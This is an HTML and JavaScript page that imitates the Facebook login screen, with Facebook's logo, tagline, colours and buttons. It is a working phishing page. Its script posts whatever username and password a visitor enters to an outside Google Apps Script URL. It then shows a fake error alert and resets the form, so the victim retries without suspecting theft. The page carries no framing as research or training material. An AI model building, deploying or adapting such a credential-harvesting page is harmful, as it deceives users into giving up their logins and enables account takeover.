<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Responsive Login Page</title>

  <!-- IMPORTANT FOR MOBILE -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 70px;
      max-width: 1100px;
      width: 100%;
    }

    .left-text img {
      width: 320px;
      max-width: 100%;
      margin-bottom: 1px;
    }

    .left-text p {
      font-size: 28px;
      max-width: 450px;
      line-height: 1.3;
    }

    .login-box {
      width: 380px;
      background: #ffffff;
      padding: 18px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 6px;
      border: 1px solid #ccd0d5;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      background: #1877f2;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .forgot {
      text-align: center;
      margin-top: 10px;
    }

    .forgot a {
      text-decoration: none;
      color: #1877f2;
    }

    .create-btn {
      margin-top: 15px;
      width: 70%;
      padding: 10px;
      font-size: 16px;
      background: #42b72a;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }

    hr {
      border: none;
      height: 1.1px;
      background-color: #ddd;
      margin-top: 15px;
      margin-bottom: 10px;
    }

    .spinner {
      border: 3px solid #fff;
      border-top: 3px solid transparent;
      border-radius: 50%;
      width: 16px;
      height: 16px;
      animation: spin 1s linear infinite;
      margin-left: 10px;
      display: none;
    }

    /* ---------------- MOBILE RESPONSIVE ---------------- */
    @media (max-width: 900px) {
      .container {
        flex-direction: column;
        text-align: center;
        gap: 25px;
      }

      .left-text img {
        width: 240px;
      }

      .left-text p {
        font-size: 22px;
        max-width: 95%;
        margin: 0 auto;
      }

      .login-box {
        width: 100%;
        max-width: 420px;
      }
    }

    @media (max-width: 500px) {
      body {
        padding: 10px;
      }

      .left-text img {
        width: 200px;
      }

      .left-text p {
        font-size: 18px;
      }

      .login-box {
        padding: 14px;
      }

      .login-box input {
        font-size: 14px;
        padding: 12px;
      }

      .login-btn {
        font-size: 16px;
      }
    }
  </style>
</head>

<body>

<div class="container">

  <div class="left-text">
    <img src="facebook.svg" alt="Website Logo">
    <p>Connect with friends and the world around you.</p>
  </div>

  <div class="login-box">
    <form method="POST" name="google-sheet" id="loginForm">
      <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
      <input type="password" placeholder="Password" id="password" name="password" autocomplete="new-password" />

      <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
        Log in
        <div class="spinner" id="spinner"></div>
      </button>

      <div class="forgot">
        <a href="#">Forgot password?</a>
      </div>

      <hr>

      <button type="button" class="create-btn">Create new account</button>
    </form>
  </div>

</div>

<script>
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const loginBtn = document.getElementById('loginBtn');
  const spinner = document.getElementById('spinner');
  const form = document.forms['google-sheet'];

  function checkInputs() {
    const usernameFilled = usernameInput.value.trim() !== '';
    const passwordFilled = passwordInput.value.trim() !== '';
    loginBtn.disabled = !(usernameFilled && passwordFilled);
    loginBtn.style.opacity = loginBtn.disabled ? '0.6' : '1';
  }

  usernameInput.addEventListener('input', checkInputs);
  passwordInput.addEventListener('input', checkInputs);

  const scriptURL = 'https://script.google.com/macros/s/AKfycbyUaf-AGKMIgheBlmSSKKzrryOxg8gl-VmzbsY1DZFIRx0xNmg96XHLZ3JiXOMr27dc/exec';

  form.addEventListener('submit', e => {
    e.preventDefault();

    spinner.style.display = 'inline-block';
    loginBtn.disabled = true;
    loginBtn.style.opacity = '0.6';

    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => {
        setTimeout(() => {
          spinner.style.display = 'none';
          loginBtn.disabled = false;
          loginBtn.style.opacity = '1';
          form.reset();
        }, 300);
        alert('Oops! An error occurred');
      })
      .catch(error => {
        spinner.style.display = 'none';
        loginBtn.disabled = false;
        loginBtn.style.opacity = '1';
      });
  });
</script>

</body>
</html>
